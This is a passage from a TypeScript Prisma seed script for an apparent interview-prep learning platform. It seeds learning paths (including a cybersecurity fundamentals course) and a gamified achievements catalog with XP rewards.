      tradeoffs: "Fresh index requires continuous crawling (expensive); batch crawl is cheaper but stale. Full inverted index in memory is fast but ~10TB for 10B docs; disk-based index is cheaper but adds I/O. PageRank computation is expensive (iterative, runs offline weekly)." },
  ];

  for (const q of systemDesignQuestions) {
    await prisma.systemDesignQuestion.upsert({
      where: { slug: q.slug },
      update: {},
      create: q,
    });
  }
  console.log("System design questions seeded.");

  // Seed Learning Paths
  const learningPaths = [
    { slug: "dsa-foundations", title: "DSA Foundations", description: "Master the core data structures and algorithms needed for technical interviews at top companies.", targetTrack: "student", estimatedWeeks: 12, planAccess: "free" as const,
      modules: ["Arrays & Hashing", "Two Pointers", "Sliding Window", "Stack", "Binary Search", "Linked List", "Trees", "Tries", "Heap/Priority Queue", "Backtracking", "Graphs", "DP"] },
    { slug: "oop-mastery", title: "OOP & Design Patterns", description: "Learn object-oriented design from SOLID principles to all 23 GoF design patterns with real-world examples.", targetTrack: "student", estimatedWeeks: 8, planAccess: "free" as const,
      modules: ["SOLID Principles", "Creational Patterns", "Structural Patterns", "Behavioral Patterns", "Refactoring", "Design Reviews"] },
    { slug: "cybersecurity-fundamentals", title: "Cybersecurity Fundamentals", description: "Cover OWASP Top 10, cryptography, network security, and hands-on CTF challenges.", targetTrack: "student", estimatedWeeks: 10, planAccess: "free" as const,
      modules: ["Web Security (OWASP)", "Cryptography Basics", "Network Security", "Authentication & Sessions", "CTF Practice", "Cloud Security"] },
    { slug: "system-design-pro", title: "System Design for Interviews", description: "Practice designing scalable distributed systems for FAANG and top startup interviews.", targetTrack: "professional", estimatedWeeks: 6, planAccess: "basic" as const,
      modules: ["Scalability Concepts", "Database Design", "Caching", "Message Queues", "CDN & Load Balancing", "10 Practice Systems"] },
    { slug: "backend-engineering", title: "Senior Backend Engineering", description: "Level up from developer to senior engineer: distributed systems, observability, performance, and architecture.", targetTrack: "professional", estimatedWeeks: 16, planAccess: "pro" as const,
      modules: ["Microservices", "Event-Driven Architecture", "API Design", "Observability", "Performance Engineering", "Distributed Transactions", "Security Engineering"] },
    { slug: "engineering-leadership", title: "Engineering Leadership", description: "Transition from IC to technical lead: architecture decision records, technical roadmaps, and team design reviews.", targetTrack: "expert", estimatedWeeks: 20, planAccess: "pro" as const,
      modules: ["Technical Strategy", "Architecture Reviews", "ADRs", "Mentoring", "Cross-team Collaboration", "Engineering Culture"] },
  ];

  for (const p of learningPaths) {
    await prisma.learningPath.upsert({
      where: { slug: p.slug },
      update: {},
      create: p,
    });
  }
  console.log("Learning paths seeded.");

  // Seed Achievements catalog
  const achievements = [
    // DSA
    { key: "first_blood",     name: "First Blood",        icon: "🩸", category: "dsa",         rarity: "common",    xpReward: 25,  description: "Solve your first DSA problem" },
    { key: "dsa_10",          name: "Problem Crusher",    icon: "💪", category: "dsa",         rarity: "common",    xpReward: 50,  description: "Solve 10 DSA problems" },
    { key: "dsa_50",          name: "Algorithm Adept",    icon: "⚡", category: "dsa",         rarity: "rare",      xpReward: 150, description: "Solve 50 DSA problems" },
    { key: "dsa_100",         name: "Code Centurion",     icon: "🏆", category: "dsa",         rarity: "epic",      xpReward: 400, description: "Solve 100 DSA problems" },
    { key: "hard_hitter",     name: "Hard Hitter",        icon: "🔥", category: "dsa",         rarity: "rare",      xpReward: 200, description: "Solve 5 hard difficulty problems" },
    // OOP
    { key: "pattern_collector", name: "Pattern Collector", icon: "🧩", category: "oop",        rarity: "common",    xpReward: 40,  description: "Complete 5 design pattern lessons" },
    { key: "solid_foundation",  name: "SOLID Foundation",  icon: "🏗️", category: "oop",        rarity: "common",    xpReward: 60,  description: "Learn all 5 SOLID principles" },
    { key: "gof_master",        name: "GoF Master",        icon: "📐", category: "oop",        rarity: "epic",      xpReward: 300, description: "Complete all 23 GoF design patterns" },
    { key: "refactor_king",     name: "Refactor King",     icon: "♻️", category: "oop",        rarity: "rare",      xpReward: 100, description: "Complete all Creational patterns" },
    { key: "behavior_guru",     name: "Behaviour Guru",    icon: "🧠", category: "oop",        rarity: "rare",      xpReward: 120, description: "Complete all Behavioural patterns" },
    // Security
    { key: "security_rookie",  name: "Security Rookie",   icon: "🔐", category: "security",   rarity: "common",    xpReward: 30,  description: "Complete your first security lesson" },
    { key: "owasp_defender",   name: "OWASP Defender",    icon: "🛡️", category: "security",   rarity: "rare",      xpReward: 100, description: "Complete all OWASP Top 10 lessons" },
    { key: "flag_hunter",      name: "Flag Hunter",       icon: "🚩", category: "security",   rarity: "common",    xpReward: 75,  description: "Solve your first CTF challenge" },
    { key: "ctf_elite",        name: "CTF Elite",         icon: "👾", category: "security",   rarity: "epic",      xpReward: 250, description: "Solve 5 CTF challenges" },
    { key: "cipher_breaker",   name: "Cipher Breaker",    icon: "🔓", category: "security",   rarity: "rare",      xpReward: 150, description: "Solve a cryptography CTF challenge" },
    // System Design
    { key: "system_thinker",   name: "System Thinker",    icon: "🏛️", category: "system-design", rarity: "common", xpReward: 50,  description: "Submit your first system design response" },
    { key: "architect",        name: "Architect",          icon: "🗺️", category: "system-design", rarity: "epic",   xpReward: 300, description: "Attempt all system design questions" },
    { key: "scale_master",     name: "Scale Master",       icon: "📈", category: "system-design", rarity: "rare",   xpReward: 150, description: "Attempt 5 system design questions" },
    // Community
    { key: "community_voice",  name: "Community Voice",   icon: "💬", category: "community",  rarity: "common",    xpReward: 20,  description: "Create your first community post" },
    { key: "helpful_hand",     name: "Helpful Hand",      icon: "🤝", category: "community",  rarity: "rare",      xpReward: 80,  description: "Write 10 replies to community posts" },
    // Consistency
    { key: "streak_7",         name: "Week Warrior",      icon: "📅", category: "consistency", rarity: "common",   xpReward: 70,  description: "Maintain a 7-day learning streak" },
    { key: "streak_30",        name: "Monthly Master",    icon: "🌟", category: "consistency", rarity: "epic",     xpReward: 300, description: "Maintain a 30-day learning streak" },
    { key: "streak_100",       name: "Century Club",      icon: "💯", category: "consistency", rarity: "legendary", xpReward: 1000, description: "Maintain a 100-day learning streak" },
    // Career
    { key: "path_pioneer",     name: "Path Pioneer",      icon: "🗺️", category: "career",     rarity: "common",    xpReward: 30,  description: "Enrol in your first learning path" },
    { key: "expert_network",   name: "Expert Network",    icon: "🌐", category: "career",     rarity: "rare",      xpReward: 100, description: "Connect with an expert mentor" },
  ];

  for (const a of achievements) {
    await prisma.achievement.upsert({ where: { key: a.key }, update: {}, create: a });
  }
  console.log("Achievements seeded.");

  console.log("Seed complete!");
}

main()
  .catch((e) => { console.error(e); process.exit(1); })
  .finally(() => prisma.$disconnect());
